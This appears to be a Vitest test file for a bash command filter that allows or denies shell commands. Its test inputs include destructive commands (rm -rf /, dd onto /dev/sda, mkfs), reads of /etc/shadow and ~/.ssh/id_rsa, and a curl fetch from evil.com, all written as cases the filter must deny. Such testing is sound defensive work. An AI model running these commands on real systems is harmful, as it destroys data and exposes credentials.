import { describe, it, expect } from 'vitest';
import { createBashFilter, DEFAULT_BASH_FILTER_CONFIG } from '../../src/security/bash-filter.js';

describe('createBashFilter', () => {
  const filter = createBashFilter(DEFAULT_BASH_FILTER_CONFIG);

  describe('always-blocked patterns', () => {
    it('blocks rm -rf /', () => {
      const result = filter({ command: 'rm -rf /' });
      expect(result.behavior).toBe('deny');
    });

    it('blocks rm -rf / with trailing space', () => {
      const result = filter({ command: 'rm -rf / ' });
      expect(result.behavior).toBe('deny');
    });

    it('blocks dd writing to block device', () => {
      const result = filter({ command: 'dd if=/dev/zero of=/dev/sda' });
      expect(result.behavior).toBe('deny');
    });

    it('blocks mkfs commands', () => {
      const result = filter({ command: 'mkfs.ext4 /dev/sdb1' });
      expect(result.behavior).toBe('deny');
    });
  });

  describe('sudo/su blocking', () => {
    it('blocks sudo', () => {
      const result = filter({ command: 'sudo apt-get install curl' });
      expect(result.behavior).toBe('deny');
      expect((result as any).message).toMatch(/sudo/);
    });

    it('blocks su with arguments', () => {
      const result = filter({ command: 'su root' });
      expect(result.behavior).toBe('deny');
    });

    it('allows commands containing "sudo" as a substring in a path', () => {
      // "sudoku" should not be blocked
      const result = filter({ command: 'echo sudoku' });
      expect(result.behavior).toBe('allow');
    });
  });

  describe('sensitive path blocking', () => {
    it('blocks access to /etc/shadow', () => {
      const result = filter({ command: 'cat /etc/shadow' });
      expect(result.behavior).toBe('deny');
    });

    it('blocks access to /etc/passwd', () => {
      const result = filter({ command: 'cat /etc/passwd' });
      expect(result.behavior).toBe('deny');
    });

    it('blocks access to ~/.ssh/', () => {
      const result = filter({ command: 'cat ~/.ssh/id_rsa' });
      expect(result.behavior).toBe('deny');
    });
  });

  describe('allowed commands', () => {
    it('allows a simple ls', () => {
      const result = filter({ command: 'ls -la /tmp' });
      expect(result.behavior).toBe('allow');
    });

    it('allows npm install', () => {
      const result = filter({ command: 'npm install' });
      expect(result.behavior).toBe('allow');
    });

    it('allows git status', () => {
      const result = filter({ command: 'git status' });
      expect(result.behavior).toBe('allow');
    });
  });

  describe('missing command field', () => {
    it('denies when command field is missing', () => {
      const result = filter({ cmd: 'ls' });
      expect(result.behavior).toBe('deny');
      expect((result as any).message).toMatch(/command/);
    });

    it('denies when command is not a string', () => {
      const result = filter({ command: 42 });
      expect(result.behavior).toBe('deny');
    });
  });

  describe('custom blocked patterns', () => {
    it('blocks commands matching custom pattern', () => {
      const customFilter = createBashFilter({
        ...DEFAULT_BASH_FILTER_CONFIG,
        blockedPatterns: ['curl\\s+.*evil\\.com'],
      });
      const result = customFilter({ command: 'curl https://evil.com/payload' });
      expect(result.behavior).toBe('deny');
    });

    it('allows commands not matching custom pattern', () => {
      const customFilter = createBashFilter({
        ...DEFAULT_BASH_FILTER_CONFIG,
        blockedPatterns: ['curl\\s+.*evil\\.com'],
      });
      const result = customFilter({ command: 'curl https://good.com/api' });
      expect(result.behavior).toBe('allow');
    });
  });

  describe('allowlist mode', () => {
    it('denies commands not in allowlist', () => {
      const customFilter = createBashFilter({
        allowedPatterns: ['^git\\s', '^npm\\s'],
      });
      const result = customFilter({ command: 'rm somefile' });
      expect(result.behavior).toBe('deny');
      expect((result as any).message).toMatch(/allowed pattern/);
    });

    it('allows commands matching allowlist', () => {
      const customFilter = createBashFilter({
        allowedPatterns: ['^git\\s', '^npm\\s'],
      });
      const result = customFilter({ command: 'git log --oneline' });
      expect(result.behavior).toBe('allow');
    });
  });

  describe('max command length', () => {
    it('denies commands exceeding max length', () => {
      const customFilter = createBashFilter({ maxCommandLength: 10 });
      const result = customFilter({ command: 'echo hello world this is too long' });
      expect(result.behavior).toBe('deny');
      expect((result as any).message).toMatch(/length/);
    });

    it('allows commands within max length', () => {
      const customFilter = createBashFilter({ maxCommandLength: 100 });
      const result = customFilter({ command: 'ls' });
      expect(result.behavior).toBe('allow');
    });
  });
});
